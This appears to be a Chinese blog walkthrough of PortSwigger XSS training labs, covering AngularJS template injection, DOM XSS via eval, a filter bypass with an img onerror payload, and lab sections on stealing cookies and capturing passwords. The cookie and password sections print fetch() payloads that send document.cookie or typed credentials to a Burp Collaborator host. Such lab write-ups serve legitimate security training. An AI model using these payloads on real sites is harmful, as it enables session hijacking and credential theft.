+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117215648006.png" alt="image-20221117215648006"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117215752088.png" alt="image-20221117215752088"></p>
+<h2 id="反射-DOM-XSS-11"><a href="#反射-DOM-XSS-11" class="headerlink" title="反射 DOM XSS(11)"></a>反射 DOM XSS(11)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118111926170.png" alt="image-20221118111926170"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118112016238.png" alt="image-20221118112016238"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">path</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//这里代表当页面的  请求状态改变之后执行的代码</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//这里通过eval执行了 js代码 并且这里是进行了拼接操作</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">displaySearchResults</span>(searchResultsObj);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">displaySearchResults</span>(<span class="params">searchResultsObj</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> blogHeader = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;blog-header&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 通过clasname找到元素</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> blogList = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;blog-list&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> searchTerm = searchResultsObj.<span class="property">searchTerm</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 取出 searchResultsObj 中的searchTerm属性</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> searchResults = searchResultsObj.<span class="property">results</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> h1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        h1.<span class="property">innerText</span> = searchResults.<span class="property">length</span> + <span class="string">&quot; search results for &#x27;&quot;</span> + searchTerm + <span class="string">&quot;&#x27;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 添加到h1中去</span></span></span><br><span class="line"><span class="language-javascript">        blogHeader.<span class="title function_">appendChild</span>(h1);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> hr = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;hr&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        blogHeader.<span class="title function_">appendChild</span>(hr)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; searchResults.<span class="property">length</span>; ++i)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> searchResult = searchResults[i];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (searchResult.<span class="property">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> blogLink = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 添加a标签</span></span></span><br><span class="line"><span class="language-javascript">                blogLink.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, <span class="string">&quot;/post?postId=&quot;</span> + searchResult.<span class="property">id</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 存放查到的id进去</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (searchResult.<span class="property">headerImage</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> headerImage = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//添加img标签</span></span></span><br><span class="line"><span class="language-javascript">                    headerImage.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;/image/&quot;</span> + searchResult.<span class="property">headerImage</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">//存放 属性进去</span></span></span><br><span class="line"><span class="language-javascript">                    blogLink.<span class="title function_">appendChild</span>(headerImage);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                blogList.<span class="title function_">appendChild</span>(blogLink);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            blogList.<span class="property">innerHTML</span> += <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (searchResult.<span class="property">title</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> title = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                title.<span class="property">innerText</span> = searchResult.<span class="property">title</span>;</span></span><br><span class="line"><span class="language-javascript">                blogList.<span class="title function_">appendChild</span>(title);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (searchResult.<span class="property">summary</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> summary = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                summary.<span class="property">innerText</span> = searchResult.<span class="property">summary</span>;</span></span><br><span class="line"><span class="language-javascript">                blogList.<span class="title function_">appendChild</span>(summary);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (searchResult.<span class="property">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> viewPostButton = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                viewPostButton.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;button is-small&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                viewPostButton.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, <span class="string">&quot;/post?postId=&quot;</span> + searchResult.<span class="property">id</span>);</span></span><br><span class="line"><span class="language-javascript">                viewPostButton.<span class="property">innerText</span> = <span class="string">&quot;View post&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> linkback = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        linkback.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;is-linkback&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> backToBlog = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        backToBlog.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, <span class="string">&quot;/&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        backToBlog.<span class="property">innerText</span> = <span class="string">&quot;Back to Blog&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        linkback.<span class="title function_">appendChild</span>(backToBlog);</span></span><br><span class="line"><span class="language-javascript">        blogList.<span class="title function_">appendChild</span>(linkback);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>仔细看一下这里其实去发送了一个http请求</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//这里代表当页面的  请求状态改变之后执行的代码</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">            <span class="comment">//这里通过eval执行了 js代码 并且这里是进行了拼接操作</span></span><br><span class="line">            <span class="title function_">displaySearchResults</span>(searchResultsObj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118113437998.png" alt="image-20221118113437998"></p>
+<p>这里去尝试闭合一下json请求去执行js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;&quot;&#125;-alert(1)//&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&#125;-alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120011077.png" alt="image-20221118120011077"></p>
+<p>但是发现转义了 “ </p>
+<p>接着尝试 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&quot;&#125;-alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120025529.png" alt="image-20221118120025529"></p>
+<p>发现成功逃逸</p>
+<p>那么这里是怎么执行的呢 我们来尝试调试一下 在eval这里打个断点</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120138960.png" alt="image-20221118120138960"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120231085.png" alt="image-20221118120231085"></p>
+<p>可以看到 js代码执行过程</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120242937.png" alt="image-20221118120242937"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120304545.png" alt="image-20221118120304545"></p>
+<h2 id="存储型-DOM-XSS-12"><a href="#存储型-DOM-XSS-12" class="headerlink" title="存储型 DOM XSS(12)"></a>存储型 DOM XSS(12)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120645233.png" alt="image-20221118120645233"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118120637677.png" alt="image-20221118120637677"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">loadComments</span>(<span class="params">postCommentPath</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> comments = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// json 解析 响应</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">displayComments</span>(comments);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, postCommentPath + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">escapeHTML</span>(<span class="params">html</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//    这里调用了 replace 方法去过滤 &lt;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">displayComments</span>(<span class="params">comments</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> userComments = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;user-comments&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; comments.<span class="property">length</span>; ++i)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            comment = comments[i];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> commentSection = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;section&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            commentSection.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;comment&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> firstPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> avatarImgElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;avatar&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, comment.<span class="property">avatar</span> ? escapeHTML(comment.<span class="property">avatar</span>) : <span class="string">&quot;/resources/images/avatarDefault.svg&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//如果存在avatar 就过滤</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (comment.<span class="property">author</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (comment.<span class="property">website</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">let</span> websiteElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;author&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>);</span></span><br><span class="line"><span class="language-javascript">                    firstPElement.<span class="title function_">appendChild</span>(websiteElement)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> newInnerHtml = firstPElement.<span class="property">innerHTML</span> + escapeHTML(comment.<span class="property">author</span>)</span></span><br><span class="line"><span class="language-javascript">                firstPElement.<span class="property">innerHTML</span> = newInnerHtml</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (comment.<span class="property">date</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> dateObj = <span class="keyword">new</span> <span class="title class_">Date</span>(comment.<span class="property">date</span>)</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> month = <span class="string">&#x27;&#x27;</span> + (dateObj.<span class="title function_">getMonth</span>() + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> day = <span class="string">&#x27;&#x27;</span> + dateObj.<span class="title function_">getDate</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> year = dateObj.<span class="title function_">getFullYear</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (month.<span class="property">length</span> &lt; <span class="number">2</span>)</span></span><br><span class="line"><span class="language-javascript">                    month = <span class="string">&#x27;0&#x27;</span> + month;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (day.<span class="property">length</span> &lt; <span class="number">2</span>)</span></span><br><span class="line"><span class="language-javascript">                    day = <span class="string">&#x27;0&#x27;</span> + day;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                dateStr = [day, month, year].<span class="title function_">join</span>(<span class="string">&#x27;-&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> newInnerHtml = firstPElement.<span class="property">innerHTML</span> + <span class="string">&quot; | &quot;</span> + dateStr</span></span><br><span class="line"><span class="language-javascript">                firstPElement.<span class="property">innerHTML</span> = newInnerHtml</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            firstPElement.<span class="title function_">appendChild</span>(avatarImgElement);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            commentSection.<span class="title function_">appendChild</span>(firstPElement);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (comment.<span class="property">body</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> commentBodyPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                commentBodyPElement.<span class="property">innerHTML</span> = escapeHTML(comment.<span class="property">body</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                commentSection.<span class="title function_">appendChild</span>(commentBodyPElement);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            commentSection.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            userComments.<span class="title function_">appendChild</span>(commentSection);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单看一下这两段代码就可以发现怎么绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&lt;&gt;&quot;.replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;)</span><br><span class="line">&quot;&lt;&gt;&lt;&gt;&quot;.replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118122500940.png" alt="image-20221118122500940"></p>
+<p>看下源码</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118122620964.png" alt="image-20221118122620964"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118122649485.png" alt="image-20221118122649485"></p>
+<p>同样我们对比着js响应去查看下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118123304600.png" alt="image-20221118123304600"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118123456616.png" alt="image-20221118123456616"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118123512412.png" alt="image-20221118123512412"></p>
+<h2 id="利用跨站点脚本窃取-cookie-13"><a href="#利用跨站点脚本窃取-cookie-13" class="headerlink" title="利用跨站点脚本窃取 cookie(13)"></a>利用跨站点脚本窃取 cookie(13)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118123646026.png" alt="image-20221118123646026"></p>
+<p>尝试下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118124053734.png" alt="image-20221118124053734"></p>
+<p>存在xss</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118124118598.png" alt="image-20221118124118598"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 向服务器请求并获取其中的内容</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//    当遇到cors错误时进行静默处理不抛出异常</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">body</span>:<span class="variable language_">document</span>.<span class="property">cookie</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//    正文是cookie</span></span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么这里的url当然应该是攻击者能够接收信息的url </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118175948812.png" alt="image-20221118175948812"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118180016926.png" alt="image-20221118180016926"></p>
+<p>这里便拿到了cookie </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118180059540.png" alt="image-20221118180059540"></p>
+<p>尝试使用cookie登录</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118180147725.png" alt="image-20221118180147725"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118180217807.png" alt="image-20221118180217807"></p>
+<h2 id="利用跨站点脚本捕获密码-14"><a href="#利用跨站点脚本捕获密码-14" class="headerlink" title="利用跨站点脚本捕获密码(14)"></a>利用跨站点脚本捕获密码(14)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118182006625.png" alt="image-20221118182006625"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118182240681.png" alt="image-20221118182240681"></p>
+<p>存在xss</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118182259560.png" alt="image-20221118182259560"></p>
+<p>这里的目的是让我们去获取到用户的姓名和密码</p>
+<p>这样尝试下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118181958569.png" alt="image-20221118181958569"></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input name=username id=username&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://u50cnd2msgfvrahbwsqqe5rdj4pwdl.burpcollaborator.net&#x27;,&#123;</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">//    当长度改变就发请求出去</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">method:&#x27;POST&#x27;,</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">mode: &#x27;no-cors&#x27;,</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">body:username.value+&#x27;:&#x27;+this.value</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">&#125;);&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118190519309.png" alt="image-20221118190519309"></p>
+<p>成功拿到账号密码</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118191009108.png" alt="image-20221118191009108"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118191033377.png" alt="image-20221118191033377"></p>
+<h2 id="利用-XSS-执行-CSRF-15"><a href="#利用-XSS-执行-CSRF-15" class="headerlink" title="利用 XSS 执行 CSRF(15)"></a>利用 XSS 执行 CSRF(15)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118191400412.png" alt="image-20221118191400412"></p>
+<p>给了个账号密码 wiener:peter 还说有csrf</p>
+<p>先看下 xss</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118192833516.png" alt="image-20221118192833516"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118192907847.png" alt="image-20221118192907847"></p>
+<p>测试下csrf</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118193105039.png" alt="image-20221118193105039"></p>
